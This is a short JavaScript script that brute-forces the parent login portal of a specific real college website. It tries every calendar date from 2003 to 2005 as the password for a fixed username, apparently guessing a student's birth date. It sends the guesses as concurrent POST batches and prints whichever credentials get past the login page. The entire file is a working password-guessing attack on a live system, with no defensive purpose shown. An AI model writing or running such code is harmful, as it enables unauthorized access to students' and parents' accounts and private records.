const usn = 'XXXXXXXXXX'
const start = new Date('2003-01-01');
const end = new Date('2005-12-31');
const sizes = 50;

const data_passwd = [];

while(start<=end){
  const cur_d = new Date(start); 
  const yyyy = String(cur_d.getFullYear());
  const mm = String(cur_d.getMonth()+1).padStart(2,'0');
  const dd = String(cur_d.getDate()).padStart(2,'0');
  const res = {passwd : `${yyyy}-${mm}-${dd}`};
  data_passwd.push(res);
  start.setDate(start.getDate() + 1);
}

const sub_data_passwd = [];
for(let i=0;i<data_passwd.length;i+=sizes){
    sub_data_passwd.push(data_passwd.slice(i,i+sizes));
}

function form_data(arr) {
    const formData = new URLSearchParams();
    formData.append('username', usn);
    formData.append('passwd', arr.passwd);
    formData.append('remember', 'No');
    formData.append('option', 'com_user');
    formData.append('task', 'login');
    return formData;
  }

async function send_req(req_form_data){
    return fetch('https://sims.sit.ac.in/parents/index.php',{
        method: 'POST',
        body: req_form_data,
        headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        },
        credentials: 'include'
    }).then(response=>({
        url:response.url,dat :req_form_data
    }))
    .catch(error=>{
        console.log(error);
    })
}

async function process_sub_datas(sub_data_passwd){
    for(const item of sub_data_passwd){
        const responses = item.map(cred=>{
            const gen_formdata = form_data(cred);
            return send_req(gen_formdata)
        })

        const results = await Promise.all(responses);

        for(const result of results){
            if (result.url !== 'https://sims.sit.ac.in/parents/index.php') {
                console.log('Correct credentials found:', result.dat);
                process.exit(0);
            }
        }

    }

}

process_sub_datas(sub_data_passwd);